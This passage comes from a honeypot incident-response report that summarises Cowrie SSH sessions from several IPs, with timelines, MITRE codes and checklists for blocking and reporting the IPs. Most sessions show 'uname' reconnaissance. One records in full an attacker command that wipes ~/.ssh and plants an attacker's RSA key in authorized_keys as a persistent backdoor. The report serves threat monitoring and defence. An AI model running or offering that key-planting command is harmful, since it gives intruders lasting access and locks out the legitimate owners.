- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-492f32c14d69

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 10:01 |
| **Last Seen** | 2026-07-19 10:02 |
| **Session Duration** | 17s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:01:44` | `cowrie.session.connect` |
| `2026-07-19 10:01:46` | `cowrie.client.version` |
| `2026-07-19 10:01:46` | `cowrie.client.kex` |
| `2026-07-19 10:01:53` | `cowrie.login.success` |
| `2026-07-19 10:01:58` | `cowrie.session.params` |
| `2026-07-19 10:01:58` | `cowrie.command.input` |
| `2026-07-19 10:02:02` | `cowrie.log.closed` |
| `2026-07-19 10:02:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-db68176c472e

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 10:01 |
| **Last Seen** | 2026-07-19 10:02 |
| **Session Duration** | 25s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:01:54` | `cowrie.session.connect` |
| `2026-07-19 10:01:57` | `cowrie.client.version` |
| `2026-07-19 10:01:57` | `cowrie.client.kex` |
| `2026-07-19 10:02:12` | `cowrie.login.success` |
| `2026-07-19 10:02:17` | `cowrie.session.params` |
| `2026-07-19 10:02:17` | `cowrie.command.input` |
| `2026-07-19 10:02:19` | `cowrie.log.closed` |
| `2026-07-19 10:02:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f351e95de0e5

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 10:02 |
| **Last Seen** | 2026-07-19 10:02 |
| **Session Duration** | 21s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:02:06` | `cowrie.session.connect` |
| `2026-07-19 10:02:09` | `cowrie.client.version` |
| `2026-07-19 10:02:09` | `cowrie.client.kex` |
| `2026-07-19 10:02:19` | `cowrie.login.success` |
| `2026-07-19 10:02:26` | `cowrie.session.params` |
| `2026-07-19 10:02:26` | `cowrie.command.input` |
| `2026-07-19 10:02:27` | `cowrie.log.closed` |
| `2026-07-19 10:02:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ca8fc85e3d31

| Field | Detail |
|---|---|
| **Source IP** | `23.88.50[.]193` |
| **First Seen** | 2026-07-19 10:02 |
| **Last Seen** | 2026-07-19 10:02 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:02:13` | `cowrie.session.connect` |
| `2026-07-19 10:02:13` | `cowrie.client.version` |
| `2026-07-19 10:02:13` | `cowrie.client.kex` |
| `2026-07-19 10:02:14` | `cowrie.login.success` |
| `2026-07-19 10:02:15` | `cowrie.session.params` |
| `2026-07-19 10:02:15` | `cowrie.command.input` |
| `2026-07-19 10:02:15` | `cowrie.command.failed` |
| `2026-07-19 10:02:15` | `cowrie.log.closed` |
| `2026-07-19 10:02:15` | `cowrie.session.params` |
| `2026-07-19 10:02:15` | `cowrie.command.input` |
| `2026-07-19 10:02:16` | `cowrie.session.file_download` |
| `2026-07-19 10:02:16` | `cowrie.log.closed` |
| `2026-07-19 10:02:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `23.88.50[.]193` to AbuseIPDB if not already reported
- [ ] Block `23.88.50[.]193` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f7f311da43da

| Field | Detail |
|---|---|
| **Source IP** | `23.88.50[.]193` |
| **First Seen** | 2026-07-19 10:02 |
| **Last Seen** | 2026-07-19 10:02 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:02:16` | `cowrie.session.connect` |
| `2026-07-19 10:02:16` | `cowrie.client.version` |
| `2026-07-19 10:02:16` | `cowrie.client.kex` |
| `2026-07-19 10:02:16` | `cowrie.login.success` |
| `2026-07-19 10:02:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `23.88.50[.]193` to AbuseIPDB if not already reported
- [ ] Block `23.88.50[.]193` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-96aef2e4f3b8

| Field | Detail |
|---|---|
| **Source IP** | `23.88.50[.]193` |
| **First Seen** | 2026-07-19 10:02 |
| **Last Seen** | 2026-07-19 10:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:02:16` | `cowrie.session.connect` |
| `2026-07-19 10:02:16` | `cowrie.client.version` |
| `2026-07-19 10:02:17` | `cowrie.client.kex` |
| `2026-07-19 10:02:18` | `cowrie.login.success` |
| `2026-07-19 10:02:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `23.88.50[.]193` to AbuseIPDB if not already reported
- [ ] Block `23.88.50[.]193` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-46eb0a06e0fa

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 10:02 |
| **Last Seen** | 2026-07-19 10:02 |
| **Session Duration** | 19s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:02:18` | `cowrie.session.connect` |
| `2026-07-19 10:02:21` | `cowrie.client.version` |
| `2026-07-19 10:02:21` | `cowrie.client.kex` |
| `2026-07-19 10:02:29` | `cowrie.login.success` |
| `2026-07-19 10:02:35` | `cowrie.session.params` |
| `2026-07-19 10:02:35` | `cowrie.command.input` |
| `2026-07-19 10:02:38` | `cowrie.log.closed` |
| `2026-07-19 10:02:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4b17975a944f

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 10:02 |
| **Last Seen** | 2026-07-19 10:02 |
| **Session Duration** | 18s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:02:31` | `cowrie.session.connect` |
| `2026-07-19 10:02:34` | `cowrie.client.version` |
| `2026-07-19 10:02:34` | `cowrie.client.kex` |
| `2026-07-19 10:02:43` | `cowrie.login.success` |
| `2026-07-19 10:02:46` | `cowrie.session.params` |
| `2026-07-19 10:02:46` | `cowrie.command.input` |
| `2026-07-19 10:02:49` | `cowrie.log.closed` |
| `2026-07-19 10:02:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-11097fabcb70

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 10:02 |
| **Last Seen** | 2026-07-19 10:03 |
| **Session Duration** | 18s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:02:45` | `cowrie.session.connect` |
| `2026-07-19 10:02:48` | `cowrie.client.version` |
| `2026-07-19 10:02:48` | `cowrie.client.kex` |
| `2026-07-19 10:02:57` | `cowrie.login.success` |
| `2026-07-19 10:03:01` | `cowrie.session.params` |
| `2026-07-19 10:03:01` | `cowrie.command.input` |
| `2026-07-19 10:03:03` | `cowrie.log.closed` |
| `2026-07-19 10:03:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5d0eaf0dbf6f

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 10:02 |
| **Last Seen** | 2026-07-19 10:03 |
| **Session Duration** | 21s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:02:59` | `cowrie.session.connect` |
| `2026-07-19 10:03:01` | `cowrie.client.version` |
| `2026-07-19 10:03:01` | `cowrie.client.kex` |
| `2026-07-19 10:03:11` | `cowrie.login.success` |
| `2026-07-19 10:03:15` | `cowrie.session.params` |
| `2026-07-19 10:03:15` | `cowrie.command.input` |
| `2026-07-19 10:03:20` | `cowrie.log.closed` |
| `2026-07-19 10:03:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5849e1255d1c

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 10:03 |
| **Last Seen** | 2026-07-19 10:03 |
| **Session Duration** | 25s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:03:11` | `cowrie.session.connect` |
| `2026-07-19 10:03:13` | `cowrie.client.version` |
| `2026-07-19 10:03:13` | `cowrie.client.kex` |
| `2026-07-19 10:03:26` | `cowrie.login.success` |
| `2026-07-19 10:03:35` | `cowrie.session.params` |
| `2026-07-19 10:03:35` | `cowrie.command.input` |
| `2026-07-19 10:03:37` | `cowrie.log.closed` |
| `2026-07-19 10:03:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b74f3cc362b1

| Field | Detail |
|---|---|
| **Source IP** | `182.75.197[.]174` |
| **First Seen** | 2026-07-19 10:03 |
| **Last Seen** | 2026-07-19 10:03 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:03:12` | `cowrie.session.connect` |
| `2026-07-19 10:03:13` | `cowrie.client.version` |
| `2026-07-19 10:03:13` | `cowrie.client.kex` |
| `2026-07-19 10:03:14` | `cowrie.login.success` |
| `2026-07-19 10:03:15` | `cowrie.direct-tcpip.request` |
| `2026-07-19 10:03:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.75.197[.]174` to AbuseIPDB if not already reported
- [ ] Block `182.75.197[.]174` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b2413ed5fdea

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 10:03 |
| **Last Seen** | 2026-07-19 10:03 |
| **Session Duration** | 25s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:03:23` | `cowrie.session.connect` |
| `2026-07-19 10:03:26` | `cowrie.client.version` |
| `2026-07-19 10:03:26` | `cowrie.client.kex` |
| `2026-07-19 10:03:39` | `cowrie.login.success` |
| `2026-07-19 10:03:46` | `cowrie.session.params` |
| `2026-07-19 10:03:46` | `cowrie.command.input` |
| `2026-07-19 10:03:49` | `cowrie.log.closed` |
| `2026-07-19 10:03:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-891a5d4625b5

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 10:03 |
| **Last Seen** | 2026-07-19 10:04 |
| **Session Duration** | 20s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:03:40` | `cowrie.session.connect` |
| `2026-07-19 10:03:41` | `cowrie.client.version` |
| `2026-07-19 10:03:41` | `cowrie.client.kex` |
| `2026-07-19 10:03:52` | `cowrie.login.success` |
| `2026-07-19 10:03:58` | `cowrie.session.params` |
| `2026-07-19 10:03:58` | `cowrie.command.input` |
| `2026-07-19 10:04:01` | `cowrie.log.closed` |
| `2026-07-19 10:04:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-da2f165b8ec6

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 10:03 |
| **Last Seen** | 2026-07-19 10:04 |
| **Session Duration** | 20s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:03:51` | `cowrie.session.connect` |
| `2026-07-19 10:03:54` | `cowrie.client.version` |
| `2026-07-19 10:03:54` | `cowrie.client.kex` |
| `2026-07-19 10:04:03` | `cowrie.login.success` |
| `2026-07-19 10:04:09` | `cowrie.session.params` |
| `2026-07-19 10:04:09` | `cowrie.command.input` |
| `2026-07-19 10:04:12` | `cowrie.log.closed` |
| `2026-07-19 10:04:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1e005905992e

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 10:04 |
| **Last Seen** | 2026-07-19 10:04 |
| **Session Duration** | 20s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:04:04` | `cowrie.session.connect` |
| `2026-07-19 10:04:06` | `cowrie.client.version` |
| `2026-07-19 10:04:06` | `cowrie.client.kex` |
| `2026-07-19 10:04:15` | `cowrie.login.success` |
| `2026-07-19 10:04:22` | `cowrie.session.params` |
| `2026-07-19 10:04:22` | `cowrie.command.input` |
| `2026-07-19 10:04:24` | `cowrie.log.closed` |
| `2026-07-19 10:04:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f572ad63c831

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 10:04 |
| **Last Seen** | 2026-07-19 10:04 |
| **Session Duration** | 22s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:04:17` | `cowrie.session.connect` |
| `2026-07-19 10:04:20` | `cowrie.client.version` |
| `2026-07-19 10:04:20` | `cowrie.client.kex` |
| `2026-07-19 10:04:30` | `cowrie.login.success` |
| `2026-07-19 10:04:37` | `cowrie.session.params` |
| `2026-07-19 10:04:37` | `cowrie.command.input` |
| `2026-07-19 10:04:39` | `cowrie.log.closed` |
| `2026-07-19 10:04:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6db365af45e0

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 10:04 |
| **Last Seen** | 2026-07-19 10:04 |
| **Session Duration** | 19s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:04:30` | `cowrie.session.connect` |
| `2026-07-19 10:04:34` | `cowrie.client.version` |
| `2026-07-19 10:04:34` | `cowrie.client.kex` |
| `2026-07-19 10:04:44` | `cowrie.login.success` |
| `2026-07-19 10:04:49` | `cowrie.session.params` |
| `2026-07-19 10:04:49` | `cowrie.command.input` |
| `2026-07-19 10:04:50` | `cowrie.log.closed` |
| `2026-07-19 10:04:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-41d83f3cb7bb

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 10:04 |
| **Last Seen** | 2026-07-19 10:05 |
| **Session Duration** | 16s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:04:46` | `cowrie.session.connect` |
| `2026-07-19 10:04:48` | `cowrie.client.version` |
| `2026-07-19 10:04:48` | `cowrie.client.kex` |
| `2026-07-19 10:04:55` | `cowrie.login.success` |
| `2026-07-19 10:05:01` | `cowrie.session.params` |
| `2026-07-19 10:05:01` | `cowrie.command.input` |
| `2026-07-19 10:05:03` | `cowrie.log.closed` |
| `2026-07-19 10:05:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3597302f3223

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 10:04 |
| **Last Seen** | 2026-07-19 10:05 |
| **Session Duration** | 17s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:04:57` | `cowrie.session.connect` |
| `2026-07-19 10:05:01` | `cowrie.client.version` |
| `2026-07-19 10:05:01` | `cowrie.client.kex` |
| `2026-07-19 10:05:10` | `cowrie.login.success` |
| `2026-07-19 10:05:14` | `cowrie.session.params` |
| `2026-07-19 10:05:14` | `cowrie.command.input` |
| `2026-07-19 10:05:15` | `cowrie.log.closed` |
| `2026-07-19 10:05:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-55bddb0ef90d

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 10:05 |
| **Last Seen** | 2026-07-19 10:05 |
| **Session Duration** | 16s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:05:12` | `cowrie.session.connect` |
| `2026-07-19 10:05:14` | `cowrie.client.version` |
| `2026-07-19 10:05:14` | `cowrie.client.kex` |
| `2026-07-19 10:05:21` | `cowrie.login.success` |
| `2026-07-19 10:05:26` | `cowrie.session.params` |
| `2026-07-19 10:05:26` | `cowrie.command.input` |
| `2026-07-19 10:05:29` | `cowrie.log.closed` |
| `2026-07-19 10:05:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8dc2edcaaa7c

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-19 10:05 |
| **Last Seen** | 2026-07-19 10:05 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:05:17` | `cowrie.session.connect` |
| `2026-07-19 10:05:17` | `cowrie.client.version` |
| `2026-07-19 10:05:17` | `cowrie.client.kex` |
| `2026-07-19 10:05:18` | `cowrie.login.success` |
| `2026-07-19 10:05:18` | `cowrie.session.params` |
| `2026-07-19 10:05:18` | `cowrie.command.input` |
| `2026-07-19 10:05:19` | `cowrie.log.closed` |
| `2026-07-19 10:05:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4ec124ff7f78

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 10:05 |
| **Last Seen** | 2026-07-19 10:05 |
| **Session Duration** | 22s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:05:23` | `cowrie.session.connect` |
| `2026-07-19 10:05:25` | `cowrie.client.version` |
| `2026-07-19 10:05:25` | `cowrie.client.kex` |
| `2026-07-19 10:05:35` | `cowrie.login.success` |
| `2026-07-19 10:05:42` | `cowrie.session.params` |
| `2026-07-19 10:05:42` | `cowrie.command.input` |
| `2026-07-19 10:05:45` | `cowrie.log.closed` |
| `2026-07-19 10:05:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8c6f60afc82b

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 10:05 |
| **Last Seen** | 2026-07-19 10:05 |
| **Session Duration** | 24s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:05:34` | `cowrie.session.connect` |
| `2026-07-19 10:05:38` | `cowrie.client.version` |
| `2026-07-19 10:05:38` | `cowrie.client.kex` |
| `2026-07-19 10:05:51` | `cowrie.login.success` |
| `2026-07-19 10:05:57` | `cowrie.session.params` |
| `2026-07-19 10:05:57` | `cowrie.command.input` |
| `2026-07-19 10:05:59` | `cowrie.log.closed` |
| `2026-07-19 10:05:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fbac8cf98f18

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 10:05 |
| **Last Seen** | 2026-07-19 10:06 |
| **Session Duration** | 22s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:05:47` | `cowrie.session.connect` |
| `2026-07-19 10:05:50` | `cowrie.client.version` |
| `2026-07-19 10:05:50` | `cowrie.client.kex` |
| `2026-07-19 10:06:00` | `cowrie.login.success` |
| `2026-07-19 10:06:07` | `cowrie.session.params` |
| `2026-07-19 10:06:07` | `cowrie.command.input` |
| `2026-07-19 10:06:09` | `cowrie.log.closed` |
